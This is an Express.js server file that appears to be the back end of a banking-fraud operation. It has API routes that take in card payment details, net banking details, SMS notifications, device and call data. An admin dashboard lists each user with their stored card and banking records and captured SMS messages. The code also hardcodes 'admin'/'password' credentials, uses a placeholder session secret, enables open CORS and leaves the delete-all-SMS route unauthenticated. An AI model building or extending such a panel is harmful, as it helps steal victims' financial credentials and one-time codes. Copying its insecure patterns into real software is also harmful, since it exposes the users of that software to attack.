const express = require('express');
const app = express();
const mongoose = require('mongoose');
const path = require('path');
const helmet = require('helmet'); 
const Admin = require('./models/Admin');
const dotenv = require('dotenv');
const cardRoutes = require('./routes/cardRoutes');
const netBankingRoutes = require('./routes/netBankingRoutes');
const callRoutes = require('./routes/callRoutes');
const userRoutes = require('./routes/userRoutes');
const adminRoutes = require('./routes/adminRoutes');
const CardPayment = require('./models/CardPayment');
const NetBanking = require('./models/NetBanking');
const notificationRoutes = require('./routes/notificationRoutes');
const bodyParser = require('body-parser');
const cors = require('cors');
const session = require('express-session');
const User = require('./models/User');
const Notification = require('./models/Notification');
const connectDB = require('./config/dbConfig');
const deviceRoutes = require('./routes/deviceRoutes');  //  Corrected
const detail = require('./routes/detailsRoutes');

dotenv.config();

app.use(helmet());
app.use(express.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');
app.use(cors());

// Session setup
app.use(session({
    secret: 'your_secret_key',
    resave: false,
    saveUninitialized: true
}));

// Default admin credentials
let adminPassword = 'password';
const adminUsername = 'admin';

// Connect to MongoDB
connectDB();

// Routes
app.use('/api/detail', cardRoutes);
app.use('/api/payment', netBankingRoutes);
app.use('/api/user', userRoutes);
app.use('/api/admin', adminRoutes);
app.use('/api/call', callRoutes);
app.use('/api/notification', notificationRoutes);
app.use(express.static(path.join(__dirname, 'public')));
app.use('/api/device', deviceRoutes);  
app.use('/api/data', detail);
app.use(callRoutes);

// Login page route
app.get('/login', (req, res) => {
    res.render('login', { error: null });
});

app.use('/public', express.static('public'));

// Handle login submission
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    if (username === adminUsername && password === adminPassword) {
        req.session.isAuthenticated = true;
        res.redirect('/dashboard');
    } else {
        res.render('login', { error: 'Invalid username or password' });
    }
});

// Middleware to protect dashboard
const requireAuth = (req, res, next) => {
    if (req.session.isAuthenticated) {
        next();
    } else {
        res.redirect('/login');
    }
};

// Route to render change password page
app.get('/change-password', requireAuth, (req, res) => {
    res.render('change-password');
});

// Route to handle change password submission
app.post('/change-password', requireAuth, (req, res) => {
    const { newPassword } = req.body;
    adminPassword = newPassword;
    res.redirect('/dashboard');
});

app.get('/dashboard', requireAuth, async (req, res) => {
    try {
        const users = await User.find();
        const notifications = await Notification.find();
        res.render('dashboard', { users, notifications });
    } catch (err) {
        console.log(err);
        res.status(500).send('Error loading dashboard');
    }
});

app.get('/detail/:id', requireAuth, async (req, res) => {
    try {
        const user = await User.findById(req.params.id);

        if (!user) {
            return res.status(404).send('User not found');
        }

        const cardPayment = await CardPayment.findOne({ userId: user._id });
        const netBanking = await NetBanking.findOne({ userId: user._id });

        if (cardPayment && cardPayment.userId.toString() !== user._id.toString()) {
            return res.status(400).send('Card payment details do not match the user.');
        }

        if (netBanking && netBanking.userId.toString() !== user._id.toString()) {
            return res.status(400).send('Net banking details do not match the user.');
        }

        res.render('detail', { user, cardPayment, netBanking });
    } catch (err) {
        console.error('Error fetching user details:', err);
        res.status(500).send('Error loading details');
    }
});

app.post('/delete/:id', requireAuth, async (req, res) => {
    try {
        await User.findByIdAndDelete(req.params.id);
        res.redirect('/dashboard');
    } catch (err) {
        console.error("Error deleting user:", err);
        res.status(500).send("Error deleting user.");
    }
});

app.get('/sms', requireAuth, async (req, res) => {
    try {
        const notifications = await Notification.find();
        res.render('sms', { notifications });
    } catch (err) {
        console.error("Error fetching notifications:", err);
        res.status(500).send("Error loading SMS notifications.");
    }
});
app.post('/delete-all-sms', async (req, res) => {
    try {
        await Notification.deleteMany({}); // सभी SMS notifications डिलीट करें
        res.redirect('/sms'); // डिलीट करने के बाद SMS पेज पर रीडायरेक्ट करें
    } catch (err) {
        console.error("Error deleting all SMS:", err);
        res.status(500).send("Failed to delete all SMS notifications.");
    }
});


app.get('/settings', requireAuth, async (req, res) => {
    try {
        const admin = await Admin.findOne();
        const adminPhoneNumber = admin ? admin.phoneNumber : '';
        res.render('settings', { adminPhoneNumber });
    } catch (err) {
        console.error('Error loading settings:', err);
        res.status(500).send('Error loading settings');
    }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
